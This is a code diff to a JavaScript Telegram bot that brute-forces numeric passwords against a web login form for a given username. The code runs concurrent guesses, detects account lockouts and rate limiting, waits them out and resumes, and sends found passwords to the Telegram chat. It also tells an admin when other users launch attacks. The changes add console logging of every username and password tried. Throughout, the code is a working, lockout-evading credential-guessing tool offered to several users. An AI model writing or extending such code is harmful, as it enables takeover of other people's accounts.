@@ -261,11 +261,14 @@ async function tryLogin(username, password) {
 
     if (
       lockedMessage &&
-      (lockedMessage.includes("قفل") || lockedMessage.includes("locked"))
+      (lockedMessage.includes("قفل") ||
+        lockedMessage.includes("locked") ||
+        lockedMessage.includes("lock"))
     ) {
+      console.log(`🔒 LOCKED - Username: ${username} | Password: ${password}`);
       return {
         success: false,
-        message: `🔒 LOCKED - ${lockedMessage}`,
+        message: `LOCKED`,
         password,
         isLocked: true,
       };
@@ -273,6 +276,7 @@ async function tryLogin(username, password) {
 
     if (errorMessage || loginError || validationError) {
       botStats.totalFailed++;
+      console.log(`❌ FAILED - Username: ${username} | Password: ${password}`);
       return {
         success: false,
         message: errorMessage || loginError || validationError || "Invalid",
@@ -282,44 +286,62 @@ async function tryLogin(username, password) {
 
     if (loginResponse.status === 302 || loginResponse.status === 301) {
       botStats.totalSuccess++;
-      return { success: true, message: "✅ Redirected", password };
+      console.log(
+        `✅ SUCCESS - Username: ${username} | Password: ${password} | Status: Redirected`
+      );
+      return { success: true, message: "Redirected", password };
     }
 
     if ($response('input[name="txtUserName"]').length > 0) {
       botStats.totalFailed++;
+      console.log(`❌ FAILED - Username: ${username} | Password: ${password}`);
       return { success: false, message: "Invalid", password };
     }
 
     botStats.totalSuccess++;
-    return { success: true, message: "✅ Logged in", password };
+    console.log(
+      `✅ SUCCESS - Username: ${username} | Password: ${password} | Status: Logged in`
+    );
+    return { success: true, message: "Logged in", password };
   } catch (error) {
     botStats.totalRequests++;
 
     if (error.response && error.response.status === 302) {
       botStats.totalSuccess++;
-      return { success: true, message: "✅ Redirect", password };
+      console.log(
+        `✅ SUCCESS - Username: ${username} | Password: ${password} | Status: Redirect`
+      );
+      return { success: true, message: "Redirect", password };
     }
 
     if (error.code === "ECONNABORTED" || error.message.includes("timeout")) {
       botStats.totalFailed++;
-      return { success: false, message: "⏱️ TIMEOUT", password };
+      console.log(`⏱️ TIMEOUT - Username: ${username} | Password: ${password}`);
+      return { success: false, message: "TIMEOUT", password };
     }
 
     if (error.response && error.response.status === 429) {
+      console.log(
+        `🔒 RATE LIMITED - Username: ${username} | Password: ${password}`
+      );
       return {
         success: false,
-        message: "🔒 Rate limited",
+        message: "Rate limited",
         password,
         isLocked: true,
       };
     }
 
     botStats.totalFailed++;
-    return { success: false, message: `❌ ${error.message}`, password };
+    console.log(
+      `❌ ERROR - Username: ${username} | Password: ${password} | ${error.message}`
+    );
+    return { success: false, message: error.message, password };
   }
 }
 
 async function checkIfStillLocked(username) {
+  console.log(`🔍 Checking if ${username} is still locked...`);
   const testPassword = "999999";
   const result = await tryLogin(username, testPassword);
   return result.isLocked || false;
@@ -359,6 +381,12 @@ async function bruteForceUsername(username, chatId) {
 
   await bot.sendMessage(chatId, startMessage, { parse_mode: "Markdown" });
 
+  console.log(`\n🚀 ===== TEST STARTED =====`);
+  console.log(`👤 Username: ${username}`);
+  console.log(`🔑 Range: ${START} - ${END}`);
+  console.log(`⚡ Concurrent: ${CONCURRENT_REQUESTS}`);
+  console.log(`===========================\n`);
+
   if (chatId.toString() !== ADMIN_CHAT_ID) {
     await sendTelegram(
       `🔔 *New User Started Test*\n\n` +
@@ -374,6 +402,7 @@ async function bruteForceUsername(username, chatId) {
         `🛑 *Test Stopped*\n\n👤 Username: \`${username}\``,
         { parse_mode: "Markdown" }
       );
+      console.log(`🛑 Test stopped for ${username}`);
       runningTasks.delete(username);
       return;
     }
@@ -393,6 +422,7 @@ async function bruteForceUsername(username, chatId) {
 
       if (result.isLocked) {
         batchHasLock = true;
+
         const lockMessage =
           `🔒 *Account Locked!*\n\n` +
           `👤 Username: \`${username}\`\n` +
@@ -400,16 +430,28 @@ async function bruteForceUsername(username, chatId) {
           `⏰ Waiting ${LOCK_RETRY_DELAY / 1000 / 60} minutes...`;
 
         await bot.sendMessage(chatId, lockMessage, { parse_mode: "Markdown" });
+        console.log(`\n🔒 ===== ACCOUNT LOCKED =====`);
+        console.log(`👤 Username: ${username}`);
+        console.log(`🔑 Password: ${result.password}`);
+        console.log(`⏰ Waiting ${LOCK_RETRY_DELAY / 1000 / 60} minutes...`);
+        console.log(`==============================\n`);
 
         await sleep(LOCK_RETRY_DELAY);
 
         let stillLocked = await checkIfStillLocked(username);
+
         while (stillLocked && runningTasks.get(username)?.isRunning) {
           await bot.sendMessage(
             chatId,
-            `⏰ Still locked: \`${username}\`\n` +
-              `Waiting ${LOCK_RETRY_DELAY / 1000 / 60} more minutes...`,
+            `⏰ Still locked: \`${username}\`\nWaiting ${
+              LOCK_RETRY_DELAY / 1000 / 60
+            } more minutes...`,
             { parse_mode: "Markdown" }
+          );
+          console.log(
+            `⏰ Still locked: ${username} - Waiting ${
+              LOCK_RETRY_DELAY / 1000 / 60
+            } more minutes...`
           );
           await sleep(LOCK_RETRY_DELAY);
           stillLocked = await checkIfStillLocked(username);
@@ -421,6 +463,7 @@ async function bruteForceUsername(username, chatId) {
             `✅ Lock released: \`${username}\` - Continuing...`,
             { parse_mode: "Markdown" }
           );
+          console.log(`✅ Lock released for ${username} - Continuing...\n`);
           i -= CONCURRENT_REQUESTS;
         }
         break;
@@ -428,6 +471,7 @@ async function bruteForceUsername(username, chatId) {
 
       if (result.success) {
         task.successCount++;
+
         const successMessage =
           `🎉 *Password Found!*\n\n` +
           `👤 Username: \`${username}\`\n` +
@@ -437,6 +481,12 @@ async function bruteForceUsername(username, chatId) {
         await bot.sendMessage(chatId, successMessage, {
           parse_mode: "Markdown",
         });
+
+        console.log(`\n🎉 ===== PASSWORD FOUND! =====`);
+        console.log(`👤 Username: ${username}`);
+        console.log(`🔑 Password: ${result.password}`);
+        console.log(`✅ Status: ${result.message}`);
+        console.log(`==============================\n`);
 
         dailyLog.successfulLogins.push({
           username: username,
@@ -451,32 +501,6 @@ async function bruteForceUsername(username, chatId) {
       } else {
         task.failedCount++;
       }
-    }
-
-    if (Date.now() - task.lastUpdate > 30000 && !batchHasLock) {
-      task.lastUpdate = Date.now();
-      const elapsed = ((Date.now() - task.startTime) / 1000 / 60).toFixed(2);
-      const speed = (
-        (task.processedCount / (Date.now() - task.startTime)) *
-        1000
-      ).toFixed(2);
-      const progress = (
-        (task.processedCount / (END - START + 1)) *
-        100
-      ).toFixed(2);
-
-      await bot.sendMessage(
-        chatId,
-        `📊 *Progress Update*\n\n` +
-          `👤 Username: \`${username}\`\n` +
-          `🔢 Progress: ${progress}%\n` +
-          `📝 Tested: ${task.processedCount}\n` +
-          `✅ Success: ${task.successCount}\n` +
-          `❌ Failed: ${task.failedCount}\n` +
-          `⚡ Speed: ${speed} req/s\n` +
-          `⏱️ Time: ${elapsed} min`,
-        { parse_mode: "Markdown" }
-      );
     }
 
     if (!batchHasLock && i + CONCURRENT_REQUESTS <= END) {
@@ -495,6 +519,14 @@ async function bruteForceUsername(username, chatId) {
     `⏱️ Time: ${totalTime} min`;
 
   await bot.sendMessage(chatId, finalMessage, { parse_mode: "Markdown" });
+
+  console.log(`\n✅ ===== TEST COMPLETED =====`);
+  console.log(`👤 Username: ${username}`);
+  console.log(`📊 Total Tested: ${task.processedCount}`);
+  console.log(`✅ Success: ${task.successCount}`);
+  console.log(`❌ Failed: ${task.failedCount}`);
+  console.log(`⏱️ Time: ${totalTime} minutes`);
+  console.log(`=============================\n`);
 
   dailyLog.completedTasks.push({
     username: username,
